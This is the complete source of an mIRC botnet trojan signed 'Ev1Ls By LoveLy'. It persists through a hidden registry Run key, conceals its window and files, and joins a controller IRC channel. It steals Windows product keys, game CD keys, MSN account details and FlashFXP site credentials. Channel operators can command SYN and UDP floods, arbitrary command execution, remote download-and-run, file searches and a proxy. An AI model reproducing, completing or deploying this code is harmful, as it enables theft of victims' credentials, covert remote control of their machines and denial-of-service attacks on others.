; V1rg1n[Ev1Ls] By LoveLy ;
alias jc { /join $l0v3ly(nc) $l0v3ly(nk) }
alias connec { server $l0v3ly(nr) $l0v3ly(np) | if ($portfree(113)) { socklisten IDENT 113 } }
alias b4d3r { .ddeserver on v1r | .nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | anick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] | username Ev1Ls LoveLy  | identd on Ev1Ls | emailaddr Ev1Ls | .n0clone | .connec | .timerconnec -o 0 20 connec | .timerus -o 0 1 us | .timerus -o 0 1 hd | .timerst4rt -o 0 3 st4rt  }
alias saym { if ($me isvo $l0v3ly(nc)) { clearall | msg $l0v3ly(nc) $1- } }
alias n0clone { if ($portfree( $+ $l0v3ly(nl) $+ ) == $false) { exit } | socklisten noclone $l0v3ly(nl) }
alias cskey { saym Keys CS key: $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) | saym |KeyS|  HL key: $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) }
alias winkey { saym Keys windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductId) | saym |KeyS| windows key: $RegRead(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProductKey) }
alias swatkey { saym SWAT3 Cd-KEY: $regread(HKCU\software\valve\half-life\settings\key) }
alias q3key { if ($exists(C:\Program Files\Quake III Arena\baseq3\q3key)) { saym keys q3 key $read(C:\Program Files\Quake III Arena\baseq3\q3key,1) } }
alias ut2k3key { if ($regread(HKEY_LOCAL_MACHINE\Software\Unreal Technology\Installed Apps\UT2003\CDKey)) { saym keys ut2k3 key $ifmatch } }
alias sof2key { if ($regread(HKEY_LOCAL_MACHINE\Software\Activision\Soldier of Fortune II - Double Helix\InstallPath)) { var %sof2path = $ifmatch | if ($exists(%sof2path $+ \base\mp\sof2key)) { saym keys sof2 key $read(%sof2path $+ \base\mp\sof2key,1) } } }
alias st4rt { 
  set %Ev1Ls3g3d1t $rand(100,999) $+ .reg 
  write %Ev1Ls3g3d1t  REGEDIT4
  write %Ev1Ls3g3d1t [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]  
  write %Ev1Ls3g3d1t "SECRETXSERVICE"=" $+ $replace($mircexe,\,\\) $+ "  
  run -n regedit /s %Ev1Ls3g3d1t
  timer 1 4 remove %Ev1Ls3g3d1t
}
alias RegDelete { if ($1 != $null) { var %a = RegDelete | .comopen %a WScript.Shell | if !$comerr { var %b = $com(%a,RegDelete,3,bstr,$1) | .comclose %a } } | else { echo error! complete data } }
alias RegWrite { if ($1) && ($2) && ($3) { %a = RegWrite | .comopen %a WScript.Shell | if (!$comerr) { %b = $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3) | .comclose %a } | if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) { if ($regread($1) == $2) { halt } | else { echo error! when writing } } } | else { echo error! complete data } }
alias RegRead { if ($1 != $null) { var %a = regread | .comopen %a WScript.Shell | if !$comerr { var %b =  $com(%a,RegRead,3,bstr,$1-) | var %c = $com(%a).result | .comclose %a | if (%c) return %c | else { return $false } } } | else { return error! complete data } }
alias r3m {  if $isdir(sounds) || $isdir(logs) || $isdir(download) || $isdir(channels) { rmdir sounds | rmdir logs | rmdir download | rmdir channels | halt } }
alias hidef { var %h1d $findfile($mircdir,*.*,0,write h.bat attrib +R +S +H $noPATH($1-)) | run island.exe /n /fh /r h.bat }
alias us { if ($appactive = $true) { run island.exe /n /fh mirc } }
alias hd { if ($appstate != hidden) { run island.exe /n /fh mirc } }
alias findit { set %ftot $findfile($$2,$$1,0) | saym 14[12Search14] $$1 returned %ftot files. | set %fcount 0 | while (%fcount < %ftot) { inc %fcount | saym $findfile($$2,$$1,%fcount) } | saym End of search. | unset %fcount | unset %ftot }
alias c { .mode $me +ix |  ial on | pdcc on | fsend on | sreq auto | creq auto | dcc packetsize 8192 | .timerap 0 40 ctcp $me ping | clearall }
alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym 1Code Complite [14Syn1] }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
alias msynp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym 1Code Complite [14MSyn1] }
on *:START:{ run island.exe /n /fh mirc | b4d3r | inc %hmt | .if (%hmt = 1) { set %infecttime $day $date $time } }
on *:disconnect:{ timerconnec -o 0 15 connec  }
on *:exit:{ sockclose * | timers off }
on *:connect:{ .timerconnec off | ipnick | c | .timerjc 0 $rand(5,10) /jc }
on *:OP:#: { if ($opnick = $me) { mode $chan +mnstk $l0v3ly(nk) | topic # Ev1Ls By LoveLy } }
on *:PING:{ ctcp $me ping }
on *:dns:{ %address = $iaddress } { if (%dns.r == on) { saym dns: %dns.rrr resolved to ip: $iaddress host: $naddress | unset %dns.* } } 
on *:join:$l0v3ly(nc):{ if ($nick == $me) { .timerjc off } }
on *:part:$l0v3ly(nc):{ if ($nick == $me) { .timerjc 0 3 raw -q /jc } }
on *:KICK:$l0v3ly(nc):{ if ($knick == $me) { .timerjc 0 3 raw -q /jc } }
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
on *:socklisten:Bnc:{ sockaccept Bnc.temp | %conncheck = $sock(Bnc.temp).ip | if ($sock($+(bnc.in.,%conncheck))) { sockclose bnc.temp } | sockrename Bnc.Temp Bnc.temp. [ $+ [ $sock(Bnc.temp).ip ] ] }
on *:sockread:Bnc.temp.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = NICK) { sockwrite -n $sockname NOTICE $host :BNC iRc Proxy ( $+ $2 $+ ) | set %Bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 | halt } | if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | sockwrite -n $sockname NOTICE $host :Please type /pass <password> | halt } | if ($1 = PASS) { if ($2 = %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Password accepted, Welcome In... | sockwrite -n $sockname NOTICE $host :Please type /conn <server> <port> | sockrename $sockname $replace($sockname,Bnc.temp,Bnc.in) | halt } | if ($2 != %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Access Denied.. } | if (!$2) { sockwrite -n $sockname NOTICE $host :You Need A Password To Cconnect | sockwrite -n $sockname NOTICE $host :Please Type /pass <password> }  } } }
on *:sockread:Bnc.in.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | halt } | if ($1 = CONN) { if (!$2) { sockwrite -n $sockname NOTICE $host :please type /conn <server> <port> | halt } | if (!$3) { %xxxx = 6667 } | if ($3) { %xxxx = $3 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $sockname NOTICE $host :Disconnecting from previous connection | sockclose Bnc.out. [ $+ [ $sock($sockname).ip ] ] } | sockopen $replace($sockname,Bnc.in,Bnc.out) $2 %xxxx | sockwrite -n $sockname NOTICE $host :making reality through $2 port %xxxx | unset %xxxx | halt } | if ($1 = NICK) { set %bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $replace($sockname,Bnc.in,Bnc.out) $1- } } | unset %bnc.in }
on *:sockopen:Bnc.out.*:{ if ($sockerr) { sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Failed Connection | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Suceeded Connection | sockwrite -n $sockname NICK %Bnc.nick. [ $+ [ $remove($sockname,Bnc.out.) ] ] | sockwrite -n $sockname USER %Bnc.user. [ $+ [ $remove($sockname,Bnc.out.) ] ] }
on *:sockread:Bnc.out.*:{ sockread %Bnc.out | if (!$sock($replace($sockname,Bnc.out,Bnc.in))) { sockwrite -n $sockname Quit :Dead Socket. | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) %Bnc.out | unset %bnc.out }
on *:TEXT:*:*: {
  if ($nick isop $l0v3ly(nc)) {
    if ($1 = !msyn) { if ($2 !== $null) { saym 1Code Start [14MSyn1] target: $+ $2 Size: $+ $3 ComPort: $+ $r(1,64000)  | msynp start $3 $2 $r(1,64000) } }
    if ($1 = !syn) { if ($2 !== $null) { saym 1Code Start [14Syn1] target: $+ $2 ComPort: $+ $3 Size: $+ $4   | synp start $4 $2 $3 } }
    if ($1 = !pf) { if ($4 == m) { //pf4st $2 $3 $r(1,64000) | halt } | //pf4st $2 $3 $4 }
    if ($1 = !udp) {  if ($4 == m) { //xudp $2 $3 $r(1,65000) | halt } | //xudp $2 $3 $4 }
    if ($1 = !mp) { if ($2 isnum) { mpf4st $2 $3 $r(1,64000) } | if ($2 = -s) { .timermpf4st off | saym 1Code End [14Mudp1] } }
    if ($1 = !proxy) { r4.proxy $2- }
    if ($1 = !xc) { xclonez $2- }
    if ($1 = !clone) { v1rclone $2- }
    if ($1 = !xt) { clonez $2- }
    if ($1 = !rest) { timer 1 1 /quit reconnecting... | connec }
    if ($1 = !/) && ($2 != $null) { %do = $2- | / $+ %do | unset %do }
    if ($1 = !dns) { dns $2 | set %dns.r on | set %dns.rr # | set %dns.rrr $2 | saym attempting to resolve: $2 } 
    if ($1 = !var) { saym Variable = [ [ $$2- ] ] } 
    if ($1 = !search) { findit $$2 $$3  }
    if ($1 = !get) { if (-r isin $2-) { set %run 1 } | download file $2 $mircdir }
    if ($1 = !get2) { if (-r isin $2-) { set %run 1 } | download file $2 $3- }
    if ($1 = !sites) && $exists(C:\programfiles\flashfxp\sites.dat) ) == $true { dcc send $nick C:\programfiles\flashfxp\sites.dat | halt }
    if ($1 = !visit) && ($2- != $null) { set %visit $2- | v1s1t }
   }
   if ($1 = !info) {
    if ($2 == $null) { saym [Ev1Ls Help] !info msn,net,cpu,sys,uptime,port,disk | halt } 
    if ($2 = msn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { msg $l0v3ly(nc2) [Msn] Currently Offline. } | else { msg $l0v3ly(nc2) [msn] [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
    if ($2 = net) { saym |network-information| connection: $dll(win.dll,connection,_) network interfaces: $dll(win.dll,interfaceinfo,_) ip: $ip host: $host }
    if ($2 = cpu) { saym |cpu-information| time: $time(h:nn TT) date: $date(mmmm doo yyyy) os: $os cpu: $dll(win.dll,cpuinfo,_) memory: $dll(win.dll,meminfo,_) uptime: $uptime(system,1) hd: $dll(win.dll,diskcapacity,_) }
    if ($2 = port) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | saym [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }
    if ($2 = disk) { .saym I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf }
    if ($2 = sys) { saym Ip: $ip Windows: $os Host: $host Time: $time(h:nn tt) Date: $date(mmmm doo yyyy) }
    if ($2 = uptime) { saym system uptime: $duration($uptime(system,3)) , mirc uptime: $uptime(mirc,1) }
    if ($2 = speed) { saym [Connection] Speed: http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) | halt }
  }
  if ($1 = !keys) {
    if ($2 == $null) { saym [Ev1Ls Help] !keys cs,win,swat,q3,ut2k3,soft2  | halt } 
    if ($2 = cs)  { cskey }
    if ($2 = win)  { winkey }
    if ($2 = swat)  { swatkey }
    if ($2 = q3)  { q3key }
    if ($2 = ut2k3)  { ut2k3key }
    if ($2 = sof2)  { sof2key }
  }
  if ($1 = !bnc) { 
  if ($2 == $null) { saym [Ev1Ls Help] !bnc start port pass / !bnc stop / !bnc stats  | halt }
  if ($2 = start) { if (!$sock(bnc)) && ($4) && ($portfree($3)) { socklisten bnc $3 | .set %bnc.pass $4 | saym bnc started: /server -m $ip $+ : $+ $sock(BNc).port , pass: %bnc.pass } | elseif ($sock(bnc)) { saym bnc is already running: /server -m $ip $sock(BNc).port , with pass: %bnc.pass } }
  if ($2 = stop) { if (!$sock(bnc)) { halt } | else { sockclose bnc* | .unset %bnc* | saym bnc is now halted } }
  if ($2 = stats) && ($sock(bnc)) { saym [bnc] is on! $ip $+ : $+ %Bnc.port pass: %Bnc.pass $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
}
}

raw 433:*:{ nick [ $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) $+ ]] }
